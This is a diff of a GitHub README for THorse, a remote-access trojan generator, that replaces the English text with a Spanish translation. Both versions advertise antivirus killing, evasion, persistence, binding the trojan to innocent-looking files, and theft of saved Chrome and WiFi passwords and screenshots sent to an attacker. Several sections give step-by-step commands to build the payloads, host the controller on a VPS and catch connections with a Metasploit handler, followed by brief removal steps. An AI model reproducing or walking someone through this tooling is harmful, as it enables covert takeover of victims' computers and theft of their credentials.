@@ -14,226 +14,230 @@
   </a>
 </p>
 
-
-
 <p align="center">
-  THorse is a RAT (Remote Administrator Trojan) Generator for Windows/Linux systems written in Python 3.
-</p>
-              
-                        This small python script can do really awesome work.
-
-## Disclaimer
-<p align="center">
-  :computer: This project was created only for good purposes and personal use.
+  THorse es un Generador de RAT (Troyano de Administración Remota) para sistemas Windows/Linux escrito en Python 3.
 </p>
 
-THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.
+Descargo de responsabilidad
 
-## Features
-- [x] Works on Windows/Linux
-- [x] Notify New Victim Via Email
-- [x] Undetectable
-- [x] Does not require root or admin privileges
-- [x] Persistence
-- [x] Sends Screenshot of Victim PC's Screen via email
-- [x] Give Full Meterpreter Access to Attacker
-- [x] Didn't ever require metesploit installed to create trojan
-- [x] Creates Executable Binary With Zero Dependencies
-- [x] Create less size ~ 5mb payload with advance functionality
-- [x] Obfusticate the Payload before Compiling it, hence Bypassing few more antivirus
-- [x] Generated Payload is Encoded with Base64, hence makes extremely difficult to reverse engineer the payload
-- [x] Kill Antivirus on Victim PC & Tries to disable Windows Security Center
-- [x] Awesome Colourful Interface to generate payload
-- [x] On Attacker Side: While Creating Payload, Script Automatically Detects Missing Dependencies & Installs Them
-- [x] Able to add custom Icon to evil file
-- [x] **Built-in Binder** which can bind executable to **Any File** [.pdf, .txt, .exe etc], Running legitimate file on front end & evil codes in back-end as a service. 
-- [x] Checks for **Already Running Instance** on System, If running instance found, then only legitimate file is executed [**Multiple Instance Prohibiter**].
-- [x] Attacker can Create/Compile for Both **Windows/Linux OS** Using Linux System, But Can only Create/Compile **Windows** Executable using Windows Machine
-- [x] **Retrieves Saved Passwords** from victim System and sends it to Attacker.
+<p align="center">
+  :computer: Este proyecto fue creado solo con buenos propósitos y uso personal.
+</p>
 
-| Supported Retrives, Tries to Retrive Saved Passwords from : |
-| ----------------------------------------------------------- |
-| Chrome Browser |
-| WiFi |
-#### Note: Custom Stealer is Coded, does not relies on LaZagne
+ESTE SOFTWARE SE PROPORCIONA "TAL CUAL" SIN GARANTÍA DE NINGÚN TIPO. PUEDE USAR ESTE SOFTWARE BAJO SU PROPIO RIESGO. EL USO ES RESPONSABILIDAD COMPLETA DEL USUARIO FINAL. LOS DESARROLLADORES NO ASUMEN NINGUNA RESPONSABILIDAD Y NO SON RESPONSABLES DE NINGÚN MAL USO O DAÑO CAUSADO POR ESTE PROGRAMA.
 
-## Tested On
-[![Kali)](https://www.google.com/s2/favicons?domain=https://www.kali.org/)](https://www.kali.org) **Kali Linux - ROLLING EDITION**
+Características
 
-[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 10**
+☑ Funciona en Windows/Linux
+☑ Notifica Nueva Víctima Vía Email
+☑ Indetectable
+☑ No requiere privilegios de root o administrador
+☑ Persistencia
+☑ Envía Captura de Pantalla de la Pantalla del PC de la Víctima vía email
+☑ Da Acceso Completo de Meterpreter al Atacante
+☑ Nunca requirió tener metasploit instalado para crear el troyano
+☑ Crea un Binario Ejecutable Sin Dependencias
+☑ Crea un payload de menor tamaño ~ 5mb con funcionalidad avanzada
+☑ Ofusca el Payload antes de Compilarlo, evitando así algunos antivirus más
+☑ El Payload Generado está Codificado con Base64, lo que hace extremadamente difícil la ingeniería inversa del payload
+☑ Mata el Antivirus en el PC de la Víctima e Intenta deshabilitar el Centro de Seguridad de Windows
+☑ Interfaz Colorida Impresionante para generar el payload
+☑ En el Lado del Atacante: Al Crear el Payload, el Script Detecta Automáticamente Dependencias Faltantes y las Instala
+☑ Capaz de agregar un ícono personalizado al archivo malicioso
+☑ Binder Integrado que puede vincular un ejecutable a Cualquier Archivo [.pdf, .txt, .exe etc], Ejecutando el archivo legítimo en primer plano y los códigos maliciosos en segundo plano como un servicio.
+☑ Verifica si hay una Instancia Ya en Ejecución en el Sistema, Si se encuentra una instancia en ejecución, entonces solo se ejecuta el archivo legítimo [Prohibidor de Múltiples Instancias].
+☑ El Atacante puede Crear/Compilar tanto para Windows/Linux OS Usando un Sistema Linux, Pero Solo Puede Crear/Compilar un Ejecutable de Windows usando una Máquina Windows
+☑ Recupera Contraseñas Guardadas del sistema de la víctima y las envía al Atacante.
 
-[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 8.1 - Pro**
+Recuperaciones Soportadas, Intenta Recuperar Contraseñas Guardadas de:
+Navegador Chrome
+WiFi
 
-[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 7 - Ultimate**
+Nota: El Stealer Personalizado está Codificado, no depende de LaZagne
 
+Probado En
 
-## Following is the limitations of meterpreter payload generated using metasploit:-
-  * Have to run the Metasploit Listener before executing backdoor
-  * Backdoor itself don't become persistence, we have to use the post exploitation modules in order to make backdoor persistence. 
-    And post exploitation modules can only be used after successful exploitation.
-  * Didn't Notify us whenever payload get executed on new system.
-  
-We all know how powerful the Meterpeter payload is but still the payload made from it is not satisfactory.
+https://www.google.com/s2/favicons?domain=https://www.kali.org/ Kali Linux - EDICIÓN ROLLING
 
-## Following are the features of this payload generator which will give you a good idea of this python script:-
-  * Uses Windows registry to become persistence in windows.
-  * Also manages to become persistence in linux system.
-  * Payload can run on LINUX as well as WINDOWS.
-  * Provide Full Access, as metasploit listener could be used as well as supports custom listener (You can Create Your Own Listener)
-  * Sends Email Notification, when ever payload runs on new system, with complete system info.
-  * Generates payload within 1 minute or ever less.
-  * Supports all meterpreter post exploitation modules.
-  * Payload Can be Created on Windows as well as Linux system.
+https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/ Windows 10
 
+https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/ Windows 8.1 - Pro
 
-## Prerequisite
-- [x] Python 3.X
-- [x] Few External Modules
+https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/ Windows 7 - Ultimate
 
-## Please Note: 
-In Windows, Please Specify/Set Pyinstaller path in `paygen.py` [**Line 14**]
+Las siguientes son las limitaciones del payload de meterpreter generado usando metasploit:-
 
-Default Path is this : `PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")`
+· Tienes que ejecutar el Listener de Metasploit antes de ejecutar el backdoor
+· El backdoor en sí no se vuelve persistente, tenemos que usar los módulos de post-explotación para hacer que el backdoor sea persistente. 
+  Y los módulos de post-explotación solo pueden usarse después de una explotación exitosa.
+· No Nos Notifica cada vez que el payload se ejecuta en un nuevo sistema.
 
-**Change it according to your system**
+Todos sabemos lo poderoso que es el payload de Meterpreter, pero aún así el payload hecho a partir de él no es satisfactorio.
 
-## How To Use in Linux
+Las siguientes son las características de este generador de payload que te darán una buena idea de este script de python:-
+
+· Usa el registro de Windows para volverse persistente en Windows.
+· También logra volverse persistente en el sistema Linux.
+· El Payload puede ejecutarse tanto en LINUX como en WINDOWS.
+· Proporciona Acceso Completo, ya que se puede usar el listener de metasploit así como también soporta un listener personalizado (Puedes Crear Tu Propio Listener)
+· Envía Notificación por Email, cada vez que el payload se ejecuta en un nuevo sistema, con información completa del sistema.
+· Genera el payload en 1 minuto o incluso menos.
+· Soporta todos los módulos de post-explotación de meterpreter.
+· El Payload Puede ser Creado tanto en Windows como en Linux.
+
+Requisito Previo
+
+☑ Python 3.X
+☑ Algunos Módulos Externos
+
+Por Favor Nota:
+
+En Windows, Por Favor Especifica/Establece la ruta de Pyinstaller en paygen.py [Línea 14]
+
+La Ruta Predeterminada es esta: PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")
+
+Cámbialo según tu sistema
+
+Cómo Usar en Linux
+
 ```bash
-# Install dependencies 
-$ Install latest python 3.x
+# Instalar dependencias 
+$ Instalar la última versión de python 3.x
 
-# Navigate to the /opt directory (optional)
+# Navegar al directorio /opt (opcional)
 $ cd /opt/
 
-# Clone this repository
+# Clonar este repositorio
 $ git clone https://github.com/PushpenderIndia/thorse.git
 
-# Go into the repository
+# Ir al repositorio
 $ cd thorse
 
-# Installing dependencies
+# Instalando dependencias
 $ bash installer_linux.sh
 
-# If you are getting any errors while executing installer_linux.sh, try to install using installer_linux.py
+# Si estás obteniendo errores al ejecutar installer_linux.sh, intenta instalar usando installer_linux.py
 $ python3 installer_linux.py
 
 $ chmod +x paygen.py
 $ python3 paygen.py --help
 
-# Making Payload/RAT
+# Creando Payload/RAT
 $ python3 paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
 
-# Making Payload/RAT with Custom AVKiller [By Default, Tons of Know AntiVirus is added in Kill_Targets]
+# Creando Payload/RAT con AVKiller Personalizado [Por Defecto, Toneladas de AntiVirus Conocidos son agregados en Kill_Targets]
 $ python3 paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --kill_av AntiVirus.exe
 
-# Making Payload/RAT with Custom Time to become persistence
+# Creando Payload/RAT con Tiempo Personalizado para volverse persistente
 $ python3 paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --persistence 10 
 
-Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
+Nota: También puedes usar nuestros íconos personalizados de la carpeta icon, solo úsalos así --icon icon/pdf.ico
 ```
 
-## How To Use in VPS (Recommend)
-```
-# 1. Setup a VPS, You can buy Ubuntu VPS from any VPS Provider such as Digital Ocean, Linode, AWS, etc
+Cómo Usar en VPS (Recomendado)
 
-# 2. Connect to your VPS Using SSH
+```
+# 1. Configura un VPS, Puedes comprar un VPS Ubuntu de cualquier Proveedor de VPS como Digital Ocean, Linode, AWS, etc
+
+# 2. Conéctate a tu VPS Usando SSH
 $ ssh username@ip_address
 
-# 3. Update Your Linux VPS
+# 3. Actualiza Tu VPS Linux
 $ sudo apt update
 
-# 4. Add Kali Linux Repository
+# 4. Agrega el Repositorio de Kali Linux
 $ sudo sh -c "echo 'deb https://http.kali.org/kali kali-rolling main non-free contrib' > /etc/apt/sources.list.d/kali.list"
 
-# 5. Install gnupg package
+# 5. Instala el paquete gnupg
 $ sudo apt install gnupg
 
-# 6. Add Kali Public Keys
+# 6. Agrega las Claves Públicas de Kali
 $ wget 'https://archive.kali.org/archive-key.asc' && sudo apt-key add archive-key.asc
 
-# 7. Update VPS
+# 7. Actualiza el VPS
 $ sudo apt update
 
-# 8. Set Kali Priority
+# 8. Establece la Prioridad de Kali
 $ sudo sh -c "echo 'Package: *'>/etc/apt/preferences.d/kali.pref; echo 'Pin: release a=kali-rolling'>>/etc/apt/preferences.d/kali.pref; echo 'Pin-Priority: 50'>>/etc/apt/preferences.d/kali.pref"
 
-# 9. Update VPS
+# 9. Actualiza el VPS
 $ sudo apt update
 
-# 10. Install Metasploit Framework in VPS
+# 10. Instala Metasploit Framework en el VPS
 $ sudo apt install -t kali-rolling metasploit-framework
 
-# NOTE: Above Steps needs to be performed only for once 
+# NOTA: Los Pasos Anteriores necesitan ser realizados solo una vez 
 
-# 11. Install pip3
+# 11. Instala pip3
 $ sudo apt install python3-pip
 
-# 12. Clone this repository
+# 12. Clona este repositorio
 $ git clone https://github.com/PushpenderIndia/thorse.git
 
-# 13. Go into the repository
+# 13. Ir al repositorio
 $ cd thorse
 
-# 14. Installing dependencies
+# 14. Instalando dependencias
 $ bash installer_linux.sh
 
-# 15. If you are getting any errors while executing installer_linux.sh, try to install using installer_linux.py
+# 15. Si estás obteniendo errores al ejecutar installer_linux.sh, intenta instalar usando installer_linux.py
 $ python3 installer_linux.py
 
 $ 16. chmod +x paygen.py
 $ python3 paygen.py --help
 
-# Making Payload/RAT (If you want to Compile RAT for Windows, then Build RAT on Windows Machine & Use VPS for Controlling RAT Remotely)
+# Creando Payload/RAT (Si quieres Compilar el RAT para Windows, entonces Construye el RAT en una Máquina Windows y Usa el VPS para Controlar el RAT Remotamente)
 $ python3 paygen.py --ip VPS_Public_IP_Address --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
 
-# Making Payload/RAT with Custom AVKiller [By Default, Tons of Know AntiVirus is added in Kill_Targets]
+# Creando Payload/RAT con AVKiller Personalizado [Por Defecto, Toneladas de AntiVirus Conocidos son agregados en Kill_Targets]
 $ python3 paygen.py --ip VPS_Public_IP_Address --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --kill_av AntiVirus.exe
 
-# Making Payload/RAT with Custom Time to become persistence
+# Creando Payload/RAT con Tiempo Personalizado para volverse persistente
 $ python3 paygen.py --ip VPS_Public_IP_Address --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --persistence 10 
 
-Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
+Nota: También puedes usar nuestros íconos personalizados de la carpeta icon, solo úsalos así --icon icon/pdf.ico
 ```
 
-## How To Use in Windows
-```bash
-# Install dependencies 
-$ Install latest python 3.x
+Cómo Usar en Windows
 
-# Clone this repository
+```bash
+# Instalar dependencias 
+$ Instalar la última versión de python 3.x
+
+# Clonar este repositorio
 $ git clone https://github.com/PushpenderIndia/thorse.git
 
-# Go into the repository
+# Ir al repositorio
 $ cd thorse
 
-# Installing dependencies
+# Instalando dependencias
 $ python -m pip install -r requirements.txt
 
-# Open paygen.py in Text editor and Configure Line 15, set Pyinstaller path, Default Path is as follows :-
+# Abre paygen.py en un editor de texto y Configura la Línea 15, establece la ruta de Pyinstaller, La Ruta Predeterminada es la siguiente:-
 # PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe") 
 
-# Getting Help Menu
+# Obteniendo el Menú de Ayuda
 $ python paygen.py --help
 
-# Making Payload/RAT
+# Creando Payload/RAT
 $ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -w -o output_file_name --icon icon_path
 
-# Making Payload/RAT with Custom AVKiller [By Default, Tons of Know AntiVirus is added in Kill_Targets]
+# Creando Payload/RAT con AVKiller Personalizado [Por Defecto, Toneladas de AntiVirus Conocidos son agregados en Kill_Targets]
 $ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --kill_av AntiVirus.exe
 
-# Making Payload/RAT binded with legitimate file [Any file .exe, .pdf, .txt etc]
+# Creando Payload/RAT vinculado con un archivo legítimo [Cualquier archivo .exe, .pdf, .txt etc]
 $ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon/txt.ico --bind passwords.txt 
 
-Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
+Nota: También puedes usar nuestros íconos personalizados de la carpeta icon, solo úsalos así --icon icon/pdf.ico
 ```
 
-## Note:- Evil File will be saved inside dist/ folder, inside technowhorse/ folder
+Nota:- El Archivo Malicioso será guardado dentro de la carpeta dist/, dentro de la carpeta technowhorse/
 
-## Establishing Connection Using Msfconsole 
+Estableciendo Conexión Usando Msfconsole
 
-* You Need to Install Metasploit-Framework on your system for establishing connection
+· Necesitas Instalar Metasploit-Framework en tu sistema para establecer la conexión
+· Configuración Recomendada, Puedes intentar probarlo con cualquier otro payload en la línea 2
 
-* Recommended Settings, You can try to test it with any other payload in line 2
 ```
 $ sudo msfconsole
 msf3> use exploit/multi/handler
@@ -243,114 +247,118 @@ msf3> set LPORT 443
 msf3> run
 ```
 
-## How to Update
+Cómo Actualizar
 
-* Run updater.py to Update Autmatically or Download the latest Zip from this GitHub repo
-* Note: Git Must be Installed in order to use updater.py
+· Ejecuta updater.py para Actualizar Automáticamente o Descarga el Zip más reciente de este repositorio de GitHub
+· Nota: Git Debe estar Instalado para poder usar updater.py
 
-## Available Arguments 
-* Optional Arguments
+Argumentos Disponibles
 
-| Short Hand  | Full Hand | Description |
-| ----------  | --------- | ----------- |
-| -h          | --help    | show this help message and exit |
-| -k KILL_AV  |--kill_av KILL_AV | AntivirusKiller : Specify AV's .exe which need to be killed. Ex:- --kill_av cmd.exe |
-| -t TIME_IN_SECONDS | --persistence TIME_PERSISTENT | Becoming Persistence After __ seconds. default=10 |
-|  -w | --windows | Generate a Windows executable. |
-|  -l | --linux   | Generate a Linux executable. |
-| -b file.txt | --bind LEGITIMATE_FILE_PATH.pdf | AutoBinder : Specify Path of Legitimate file. [**Supported OS : Windows**] |
-|  -s | --steal-password | Steal Saved Password from Victim Machine [**Supported OS : Windows**] |
-|  -d | --debug | Run Virus on Foreground |
-#### Note : Either **-w/--windows** or  **-l/--linux** must be specified 
+· Argumentos Opcionales
 
-* Required Arguments
+Forma Corta Forma Completa Descripción
+-h --help muestra este mensaje de ayuda y sale
+-k KILL_AV --kill_av KILL_AV AntivirusKiller : Especifica el .exe del AV que necesita ser eliminado. Ej:- --kill_av cmd.exe
+-t TIME_IN_SECONDS --persistence TIME_PERSISTENT Volverse Persistente Después de __ segundos. predeterminado=10
+-w --windows Genera un ejecutable de Windows.
+-l --linux Genera un ejecutable de Linux.
+-b file.txt --bind LEGITIMATE_FILE_PATH.pdf AutoBinder : Especifica la Ruta del archivo Legítimo. [SO Soportado : Windows]
+-s --steal-password Roba Contraseñas Guardadas de la Máquina de la Víctima [SO Soportado : Windows]
+-d --debug Ejecuta el Virus en Primer Plano
 
-| Short Hand  | Full Hand | Description |
-| ----------  | --------- | ----------- |
-|             | --icon ICON   | Specify Icon Path, Icon of Evil File [Note : Must Be .ico] |
-|             | --ip IP_ADDRESS | Email address to send reports to. |
-|             | --port PORT   | Port of the IP Address given in the --ip argument. |
-| -e EMAIL    | --email EMAIL | Email address to send reports to. |
-| -p PASSWORD | --password PASSWORD | Password for the email address given in the -e argument. |
-| -o OUT      | --out OUT    | Output file name.|
+Nota : Ya sea -w/--windows o -l/--linux debe ser especificado
 
-## New Screenshots:
+· Argumentos Requeridos
 
+Forma Corta Forma Completa Descripción
+ --icon ICON Especifica la Ruta del Ícono, Ícono del Archivo Malicioso [Nota : Debe Ser .ico]
+ --ip IP_ADDRESS Dirección de correo electrónico a la que enviar los informes.
+ --port PORT Puerto de la Dirección IP dada en el argumento --ip.
+-e EMAIL --email EMAIL Dirección de correo electrónico a la que enviar los informes.
+-p PASSWORD --password PASSWORD Contraseña para la dirección de correo electrónico dada en el argumento -e.
+-o OUT --out OUT Nombre del archivo de salida.
 
-#### Getting Help
-![](/img/1.version1.4.PNG)
+Nuevas Capturas de Pantalla:
 
-#### Generating payload
-![](/img/2.version1.4.PNG)
+Obteniendo Ayuda
 
-### Also Refer These Old Images
+/img/1.version1.4.PNG
 
-## ~Old Screenshots:
+Generando payload
 
-#### Getting Help
-![](/img/1.help.png)
+/img/2.version1.4.PNG
 
-#### Running paygen.py Script
-![](/img/2.running_script.png)
+También Consulta Estas Imágenes Antiguas
 
-#### When RAT runs, it adds Registry to become persistence
-![](/img/3.added_registry_for_persistence.png)
+~Capturas de Pantalla Antiguas:
 
-#### Makes copy of itself and saved it inside Roming
-![](/img/4.rat_saved_roming.png)
+Obteniendo Ayuda
 
-#### Report sended by RAT
-![](/img/5.report_from_rat.png)
+/img/1.help.png
 
-#### Getting Notification From Victim PC
-![](/img/6.getting_notification.png)
+Ejecutando el Script paygen.py
 
-## Contributors:
-Currently this repo is maintained by me (Pushpender Singh). But If you want to become contributor, then add some cool feature and make a pull request, I will review, and merge it this repo.
+/img/2.running_script.png
 
-All contributor's pull request will be accepted if their pull request is worthy for this repo.
+Cuando el RAT se ejecuta, agrega Registro para volverse persistente
 
-## TODO
-- [ ] Add new features
-- [ ] Contribute GUI 
+/img/3.added_registry_for_persistence.png
 
-## Removing TechNowHorse in Windows:
+Hace una copia de sí mismo y la guarda dentro de Roming
 
-#### Method 1:
+/img/4.rat_saved_roming.png
 
-   * Go to start, type regedit and run the first program, this will open the registry editor.
-   * Navigate to the following path Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run There should be an entry called winexplorer, right click this entry and select Delete.
-   * Go to your user path > AppData > Roaming, you’ll see a file named “explorer.exe”, this is the RAT, right click > Delete.
-   * Restart the System.
+Informe enviado por el RAT
 
-#### Method 2:
-   * Run "RemoveTHorse.bat" in Infected System and then restart the PC to stop the current Running Evil File.
+/img/5.report_from_rat.png
 
-## Removing TechNowHorse in Linux:
+Recibiendo Notificación Del PC de la Víctima
 
-   * Open Autostart file with any text editor,
-     ****Autostart File Path: ~/.config/autostart/xinput.desktop****
-   * Remove these 5 lines:
-   
-            [Desktop Entry]
-            Type=Application
-            X-GNOME-Autostart-enabled=true
-            Name=Xinput
-            Exec="destination_file_name"
-        
-   * Note: **destination_file_name** is that name of evil_file which you gave 
-      to your TrojanHorse using -o parameter
-   * Reboot your system and then delete the evil file stored this this below path
-   * Destination Path, where TrojanHorse is stored : **~/.config/xnput**
+/img/6.getting_notification.png
 
+Contribuidores:
 
+Actualmente este repositorio es mantenido por mí (Pushpender Singh). Pero si quieres convertirte en contribuidor, entonces agrega alguna característica interesante y haz una pull request, la revisaré y la fusionaré en este repositorio.
 
-## Contributors
+Todas las pull requests de los contribuidores serán aceptadas si su pull request es digna para este repositorio.
 
-- Dedicated Contributors List: [Contributors](CONTRIBUTORS.md)
+TODO
+
+☐ Agregar nuevas características
+☐ Contribuir con GUI
+
+Eliminando TechNowHorse en Windows:
+
+Método 1:
+
+· Ve a inicio, escribe regedit y ejecuta el primer programa, esto abrirá el editor de registro.
+· Navega a la siguiente ruta Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run Debería haber una entrada llamada winexplorer, haz clic derecho en esta entrada y selecciona Eliminar.
+· Ve a la ruta de tu usuario > AppData > Roaming, verás un archivo llamado "explorer.exe", este es el RAT, clic derecho > Eliminar.
+· Reinicia el Sistema.
+
+Método 2:
+
+· Ejecuta "RemoveTHorse.bat" en el Sistema Infectado y luego reinicia el PC para detener el Archivo Malicioso que se está Ejecutando actualmente.
+
+Eliminando TechNowHorse en Linux:
+
+· Abre el archivo Autostart con cualquier editor de texto,
+  Ruta del Archivo Autostart: ~/.config/autostart/xinput.desktop
+· Elimina estas 5 líneas:
+  
+· Nota: destination_file_name es el nombre del archivo malicioso que le diste 
+  a tu TrojanHorse usando el parámetro -o
+· Reinicia tu sistema y luego elimina el archivo malicioso almacenado en esta ruta de abajo
+· Ruta de Destino, donde se almacena el TrojanHorse : ~/.config/xnput
+
+Contribuidores
+
+· Lista de Contribuidores Dedicados: Contribuidores
 
 <!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
+
 <!-- prettier-ignore-start -->
+
 <!-- markdownlint-disable -->
 
 <table>
@@ -369,15 +377,18 @@ All contributor's pull request will be accepted if their pull request is worthy 
 </table>
 
 <!-- markdownlint-enable -->
+
 <!-- prettier-ignore-end -->
+
 <!-- ALL-CONTRIBUTORS-LIST:END -->
 
-Contributions of any kind welcome!
+¡Contribuciones de cualquier tipo son bienvenidas!
 
->    NOTE: If you should be on the list of contributors but we forgot you, then do let us know!
+NOTA: ¡Si deberías estar en la lista de contribuidores pero te olvidamos, entonces háznoslo saber!
 
-## TODO List
-* Suggestion your own feature : )
-* GUI Development
-* Bug Fix
-* Add more browser password stealers
+Lista de TODO
+
+· Sugiere tu propia característica : )
+· Desarrollo de GUI
+· Corrección de Errores
+· Agregar más stealers de contraseñas de navegadores
